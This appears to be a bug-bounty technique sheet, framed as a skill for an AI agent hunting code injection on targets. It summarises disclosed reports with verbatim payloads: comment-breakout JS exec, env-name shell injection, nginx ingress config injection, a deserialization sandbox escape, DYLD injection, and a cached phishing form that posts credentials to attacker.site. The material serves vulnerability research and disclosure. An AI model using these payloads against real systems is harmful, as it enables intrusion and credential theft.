---
name: hunter-l3-code-injection
description: "Use when hunting Code Injection on a target. Loads the L3 technique sheet: This class covers bugs where attacker-controlled input crosses into a context that is compiled, interpreted, or executed as code: shell command strings, generated config files (nginx, synthetic record"
domain: cybersecurity
subdomain: web
tags:
- web
- code-injection
- hunting
- l3
version: '1.0'
---

# Code Injection — Technique Sheet

## Overview

This class covers bugs where attacker-controlled input crosses into a context that is compiled, interpreted, or executed as code: shell command strings, generated config files (nginx, synthetic recorder JS), template engines that call `Function()`, deserializers that rebuild executable objects, PHP injected into compiled runtime fields, and local injection vectors (DYLD, DLL hijack, debugger shells). It pays best when the injection lands on infrastructure (CI runners, k8s controllers, workers) — those reports drew CVE assignments and top-tier bounties. The unifying root cause across nearly all records: a sanitization/escaping function exists but is applied incompletely (values escaped, keys not; quotes escaped, comment delimiters not; one API path fixed, a parallel path forgotten).

## Distinct sub-patterns

### 1. Comment breakout in generated code (recorder/codegen injection)

- **Endpoint shape:** Code-generation pipelines that embed user URLs/strings into generated source inside comments. Exemplar: Synthetics recorder, `syntheticsGenerator.ts` → `waitForNavigation(url)`.
- **Payload (verbatim):** `https://example.com?q=*/require(`child_process`).exec(`touch$IFS/tmp/haxx`)/*`
- **Root cause:** The generated code wraps the URL in a `/* */` comment. The escaping layer (`quote()`) only handles quotes — it does not neutralize `*/`, so the attacker closes the comment and injects live JS without ever needing an escaped quote character.
- **Impact:** Arbitrary command execution (`touch /tmp/dee-see` demonstrated) on developer machines and CI when the recorded session is exported and run by the synthetic runner.
- **Exemplars:** 1636382 (Elastic).
- **Key lesson:** Audit every sanitization function against the *specific syntactic elements* of the destination context — here the comment terminator, not the quote.

### 2. Escaped values, unescaped keys (env var name injection)

- **Endpoint shape:** Task-definition APIs where the framework escapes env *values* but interpolates env *names* raw into a shell script. Exemplar: Taskcluster `POST /tasks/create`, `payload.env`.
- **Payload (verbatim):**
  ```
  env:
  # Commands to run in here
      test2 --help ; whoami ; ls -lah ;: '--help'
  ```
  (the command string is the variable *name*; the benign `'--help'` is the value that gets escaped)
- **Root cause:** `shell.escape()` applied to values only. The key `test2 --help ; whoami ; ls -lah ;` is emitted verbatim into a shell script on the worker.
- **Impact:** Commands (`whoami`, `ls -lah`) executed on the worker host *outside* the container.
- **Exemplars:** 2221404 (Mozilla).
- **Generalization:** Any time you see "X is sanitized," check the mirror position — key vs value, header name vs value, property name vs value (see also sub-pattern 8).

### 3. Unsanitized interpolation into generated nginx config (k8s ingress)

Three variants appeared, all "user input → nginx.conf → controller pod execution":

- **3a. Annotation injection** — `nginx.ingress.kubernetes.io/permanent-redirect`
  - **Payload (verbatim):** `https://example.com;\n    location / { return 200 "pwned"; }`
  - **Root cause:** Annotation value concatenated raw into generated nginx config, even with `allow-snippet-annotations=false`. User who can create Ingress objects (a low bar in many clusters) owns config.
  - **Impact:** Code execution on the ingress-nginx-controller pod; with the mounted ServiceAccount token, API calls to fetch all secrets/configmaps, read/write files (CVE-2023-5044). Exemplar: 2039464 (Kubernetes).
- **3b. Path directive injection bypassing the by_lua mitigation**
  - **Payload (verbatim):**
    ```
    /f292392body/ {
    limit_except POST              { deny all; }
    client_body_temp_path          /tmp/nginx/f292392;
    client_body_in_file_only       on;
    client_body_buffer_size        128K;
    #
    ```
  - **Root cause:** Ingress `path` is permissively concatenated into config. The injection uses legitimate nginx directives as a two-stage gadget: `client_body_in_file_only` writes an attacker-supplied POST body to a known temp path, then a `set_by_lua_block` is fed content from that file — sidestepping the by_lua mitigation entirely.
  - **Impact:** Read arbitrary files from the controller including the k8s ServiceAccount token; code execution. Exemplar: 2701701 (Kubernetes).
  - **Key lesson:** When a mitigation restricts one injection vector (Lua snippets), hunt sibling interpolated fields (path, annotations) for directives that stage the payload through nginx's own file-write features.

### 4. Debugger/code-execution flags accepted as parameters (hg-ssh)

- **Endpoint shape:** Custom SSH wrappers around VCS binaries where a user-controlled field is passed as a CLI argument. Exemplar: hg-ssh `repo` attribute → `hg serve --stdio`.
- **Payload (verbatim):** `--debugger`
- **Root cause:** The repo attribute isn't validated to be a repository path; it flows into the hg command line, and `hg --debugger` drops into a Pdb shell under the server's privileges.
- **Impact:** Arbitrary Python code execution on the Mercurial host (CVE-2017-9462).
- **Exemplars:** 222020 (Internet Bug Bounty).
- **Key lesson:** Any wrapper that passes user input as positional CLI args to a tool with a `--debugger`/`--exec`/`--config` style flag is vulnerable; the payload is two hyphens and a word.

### 5. Template/format strings compiled with `Function()` (Node.js)

- **5a. morgan log format** — `morgan(format)`
  - **Payload (verbatim):** `var f = morgan('25 \" + console.log('hello!'); +  //:method :url :status :res[content-length] - :response-time ms');`
  - **Root cause:** morgan compiles the format string via `Function()`. Impact conditional: serious (RCE) when chained with prototype pollution making the format controllable. Exemplar: 390881.
- **5b. doT templates via prototype pollution** — `dot.template(template)` / `dot.process()`
  - **Payload (verbatim):** `Object.prototype.templateSettings = {varname:"a,b,c,d,x=console.log(25)"};`
  - **Root cause:** doT compiles templates with `Function()`; `templateSettings.varname` from `Object.prototype` is injected into the generated function signature — so a prototype pollution primitive anywhere in the app upgrades directly to RCE. Exemplar: 390929.
  - **Key lesson:** Prototype pollution + any `Function()`-compiling library = RCE. Map the library's "settings" object to find the pollution sink.
- **5c. fastify serialization schema property name**
  - **Payload:** payload not stated.
  - **Root cause:** Property names in the serialization schema are interpolated unescaped into generated serializer code; one attacker-controlled property name = JS execution during serialization.
  - **Impact:** Remote command execution in the web server's context. Chain: control a single property name → it executes as JS during serialization → RCE. Exemplar: 532667.

### 6. Deserialization that rebuilds executable objects

- **6a. funcster `deepDeserialize`** — JSON `__js_function`
  - **Payload (verbatim):** `{ __js_function: "function testa(){var process = this.constructor.constructor('return process')(); spawn_sync = process.binding('spawn_sync'); ...spawnSync('whoami')...}()" }`
  - **Root cause:** funcster rebuilds functions from JSON as an IIFE inside `module.exports`, so the function body executes at deserialization time. The `this.constructor.constructor('return process')()` pattern escapes the sandbox to reach `process` even without a direct global reference.
  - **Impact:** OS command execution (`whoami` via `spawnSync`). Chain: supply attacker-controlled JSON → IIFE fires during deserialization → reach global/process objects. Exemplar: 350401.
- **6b. PHP `unserialize()` uninitialized memory** (CVE-2017-5340)
  - **Payload (verbatim):** `a:9000111000000010:{...}`
  - **Root cause:** A crafted huge-array serialized string makes `unserialize()` read uninitialized memory whose contents the attacker influences, faking objects with attacker-controlled destructor function pointers.
  - **Impact:** Arbitrary code execution demonstrated locally (opened gnome-calculator); likely RCE remotely. Exemplar: 195950.

### 7. PHP injection into persisted "compiled" fields (Revive Adserver)

- **Endpoint shape:** Delivery-limitation save; `logical` (and `type`) parameters, including via `ox.setChannelTargeting` XML-RPC.
- **Payload:** `logical` (recorded as parameter name; full PHP payload not stated).
- **Root cause:** Missing validation of the `logical` parameter lets a low-privileged user write malicious PHP into the `compiledlimitations` DB field, which is `eval`'d/compiled at banner delivery time. Follow-up reports show the CVE-2026-34916 fix bypassed by (a) sending a disallowed-but-valid *plugin identifier* as `type`, or (b) using the `ox.setChannelTargeting` XML-RPC method that shared the same sink.
- **Impact:** PHP code injection executed during banner delivery.
- **Exemplars:** 3656781, 3780854, 3781492 (Revive Adserver).
- **Key lesson:** "Stored PHP" sinks execute later and elsewhere (delivery workers), so the injection is invisible at submit time. When a fix lands, test sibling write paths (alternate APIs, RPC methods, plugin-type parameters) against the same sink.

### 8. Active Storage variant transform → ImageMagick (CVE-2022-21831)

- **Endpoint shape:** Rails `blob.variant(params[:t] => params[:v])` — transformation method name *and* args attacker-controlled.
- **Payload (verbatim):** `image_tag blob.variant(params[:t] => params[:v])`
- **Root cause:** Untrusted transformation method/arguments passed through to ImageMagick (mini_magick / image_processing), enabling code injection into the magick command line.
- **Impact:** RCE potential; assigned CVE-2022-21831. Exemplar: 1652042 (Internet Bug Bounty).
- **Key lesson:** DSL/facade APIs that map user input onto *method names* of a dangerous library are as dangerous as arg injection.

### 9. Module path / require argument control

- **9a. Dynamic `require()` from request data** — worker HTTP server `POST http://localhost:{port}`, `options.execModulePath`
  - **Payload (verbatim):** `{"options": {"rid": 12, "execModulePath": "./../../../pwn.js"}}`
  - **Root cause:** `require(req.body.options.execModulePath)` — attacker controls the argument to `require(x)` including traversal.
  - **Impact:** Executes arbitrary JS files not intended to run (demonstrated PWNED log). Chain: enumerate ports 1024–65535 to find the worker server → send crafted request with `execModulePath` → arbitrary JS executes. Exemplar: 660563.
- **9b. Windows module search-path planting** — `Module._initPaths`
  - **Payload (verbatim):** `const { exec } = require('child_process').exec("notepad") > a.js`
  - **Root cause:** Node on Windows unconditionally adds `%USERPROFILE%\.node_modules` to the search path; a planted module executes on `require('a')`.
  - **Impact:** Arbitrary code execution enabling AV bypass and persistence. Exemplar: 629879.

### 10. Local privilege injection vectors (desktop apps)

- **10a. DYLD_INSERT_LIBRARIES on macOS** (Nextcloud)
  - **Payload (verbatim):** `DYLD_FORCE_FLAT_NAMESPACE=1 DYLD_INSERT_LIBRARIES=./malicious.dylib /Applications/nextcloud.app/Contents/MacOS/nextcloud`
  - **Root cause:** Client lacks Hardened Runtime/library validation, so a non-root malicious app injects a dylib. Impact: Calculator opened in the app's context. Exemplars: 633266; also 2307625 (CVE-2024-37885, $250).
  - **Check:** `codesign -d --entitlements -` on the binary; missing `com.apple.security.cs.disable-library-validation` protections / no Hardened Runtime = injectable.
- **10b. DLL hijack / config planting on Windows** (Monero wallet)
  - **Payload:** payload not stated (planted malicious DLL + openssl.cnf).
  - **Root cause:** `monero-wallet-gui.exe` loads `openssl.cnf` and DLLs from a low-privilege-writable directory.
  - **Impact:** calc.exe launched and a local administrator account `backdoor` created when an admin ran the wallet. Exemplar: 630903.
- **10c. DLL injection via SetWindowsHookEx** (Kaspersky)
  - **Payload (verbatim):** `tiptsf.dll` (injected via SetWindowsHookEx)
  - **Root cause:** Kaspersky's `ClientLoadLibrary` hook permits DLLs with specific filenames (`tiptsf.dll`) to load into the AV's UI process, enabling WinAPI hooking (TrackPopupMenu, IsDialogMessageW).
  - **Impact:** Fully disabled antivirus protection, letting ransomware run before AV activation. Exemplar: 870615.

### 11. Privileged-context embeds (oEmbed whitelist abuse)

- **Endpoint shape:** oEmbed/embed whitelists in desktop chat clients. Exemplar: Steam Chat whitelist including codepen.io.
- **Payload (verbatim):** `https://codepen.io/zemnmez/pen/mGQvvq`
- **Root cause:** Embed code from a whitelisted domain executes inside the privileged Steam Chat context, escaping the normal web sandbox.
- **Impact:** Arbitrary code on the victim's machine: popped calc.exe, opened windows, launched Team Fortress 2, executed `steam://` protocol links without confirmation. Exemplar: 411329 (Valve).
- **Key lesson:** Whitelisted third-party embeds in privileged/native contexts are a code-injection boundary; a whitelist entry is a trust grant, not a sandbox.

### 12. Framework sandbox escape via unrendered template directives (AngularJS)

- **Endpoint shape:** `POST /comment`, `comment_body` containing `<code>` blocks.
- **Payload (verbatim):** `<code>...</code>`
- **Root cause:** `<code>` blocks rendered in AngularJS without `ng-non-bindable`, so AngularJS expressions inside user input were evaluated.
- **Impact:** Limited-scope AngularJS code injection causing errors leveragable for XSS or DoS of comment threads. Exemplar: 274264 (Rockstar Games).

### 13. Caching-layer header reflection enabling injection

- **Endpoint shape:** `GET /vc/blog/info.php` with custom HTTP headers.
- **Payload (verbatim):** `A: <link href="https://attacker.site/styles.css" rel="stylesheet">` and `B: <div id="background"></div><form action="https://attacker.site/wotif.php"><input name="login"><input name="password"><input type="submit"></form>`
- **Root cause:** info.php caches all incoming HTTP headers for ~1 hour and reflects them unsanitized. This is not classic RCE but injected markup executed against *other* users via the cache.
- **Impact:** External stylesheet + phishing form rendered for later visitors; victim's `HTTP_COOKIE` header (MC1, DUAID, HMS) cached and exposed to any subsequent visitor.
- **Exemplar:** 1888351 (Expedia Group).
- **Key lesson:** Self-XSS-grade reflection becomes stored attack when a cache shares it; headers are input surface too.

### 14. Control-character injection (storage corruption)

- **Endpoint shape:** Crew Status field, Rockstar social club.
- **Payload (verbatim):** `%00`
- **Root cause:** Field accepted the NULL control character, which was stored and broke subsequent status updates.
- **Impact:** User permanently unable to update their Crew Status — integrity/DoS only. Exemplar: 232499.
- **Note:** Lowest-impact record here; shows the class boundary — control-character injection without an execution sink is usually N/A or low.

### 15. Local client / mobile injection points (limited detail)

- **Kubelet Windows in-tree storage plugin** (2231019, Kubernetes): insufficient sanitization in the plugin → injection → privilege escalation to SYSTEM on all Windows nodes; verified, CVE-2023-5528, $5,000. Payload not stated.
- **MercadoLibre wallet intent redirection** (2289836): insufficient validation of external `intent` handling → intent redirection PoC enabling account takeover, arbitrary file read/deletion, and partial code execution. Payload not stated.

## Bypass / chain notes

- **Fix-bypass via sibling paths (Revive):** the CVE-2026-34916 fix on one write path was bypassed with (1) a disallowed-but-valid plugin identifier as `type`, and (2) the `ox.setChannelTargeting` XML-RPC method hitting the same sink. Always enumerate every writer to a dangerous sink before/after a fix.
- **Mitigation bypass via directive staging (k8s 2701701):** with by_lua restricted, chain nginx's own features — `client_body_in_file_only` writes the attacker's POST body to disk, `set_by_lua_block` then reads it — turning config injection into code execution without snippet permissions.
- **Prototype pollution → Function() RCE (390929, 390881):** any primitive that sets `Object.prototype.*` upgrades to RCE when a `Function()`-compiling library reads settings from the prototype chain.
- **Sandbox escape idiom (350401):** `this.constructor.constructor('return process')()` recovers `process` from inside deserialized/restricted functions.
- **$IFS shell trick (1636382):** `touch$IFS/tmp/haxx` avoids spaces in the injected shell command.
- **Multi-stage chains observed:** community-tc login (GitHub account) → task creation → worker RCE (2221404); port enumeration → worker server discovery → `require()` RCE (660563); ingress creation → controller file read → ServiceAccount token → k8s API secrets (2039464, 2701701).

## Gotchas / what NOT to do

- **Don't trust "it's escaped."** In this dataset most bugs exist *despite* a sanitizer: `quote()` missed `*/` (1636382), `shell.escape()` covered values but not keys (2221404). Test the exact metacharacters of the destination context.
- **Don't only test values — test names/keys/types/methods:** env var names (2221404), fastify schema property names (532667), ImageMagick transform method names (1652042), Revive `type` plugin identifiers (3780854).
- **Comment and comment-terminator injection** (`*/`) bypasses quote-focused escaping — include it in every codegen target.
- **CLI wrapper flags:** a bare `--debugger` beats elaborate payloads when a user-controlled arg reaches a tool invocation (222020).
- **Don't assume self-XSS is worthless** — check for caching/proxy layers that make your reflection hit other users (1888351).
- **Control characters without an execution sink** (%00, 232499) yield only corruption/DoS — expect low severity; don't oversell.
- **Local injection findings need demonstrated impact:** DYLD/DLL hooks were rewarded when they showed concrete compromise (calc, admin account, AV disable), not just "a library loaded."
- **Payloads often aren't published** (2231019, 2289836, 2307625, 532667, Revive set): absence of a stated payload means you must reconstruct from root cause, not assume a known gadget applies.

## Real-world impact examples

- **CI/developer-machine RCE:** Elastic Synthetics — `touch /tmp/dee-see` executed via a poisoned recorded session (1636382).
- **Cluster compromise:** ingress-nginx controller code exec + ServiceAccount token → all secrets/configmaps readable, arbitrary file read/write (2039464, 2701701); kubelet → SYSTEM on all Windows nodes, $5,000 (2231019).
- **Worker-host RCE:** Taskcluster env-name injection ran `whoami` outside the container on Mozilla workers (2221404).
- **Antivirus neutralization:** Kaspersky DLL injection hooked WinAPIs so ransomware could run undetected (870615).
- **End-user machine compromise:** Steam Chat oEmbed popped calc.exe, launched TF2, fired `steam://` links (411329); Nextcloud macOS dylib injection opened Calculator (633266); Monero wallet DLL hijack created an admin account `backdoor` (630903).
- **Persistent host infection:** Node.js Windows `.node_modules` planting enabled AV-bypassing persistence (629879).
- **Stored cross-user attack:** Expedia header cache leaked victim cookies (MC1, DUAID, HMS) and served a phishing form to later visitors (1888351).
- **CVE haul:** CVE-2017-9462, CVE-2017-5340, CVE-2022-21831, CVE-2023-5044, CVE-2023-5528, CVE-2024-37885, CVE-2026-34916 (+bypass).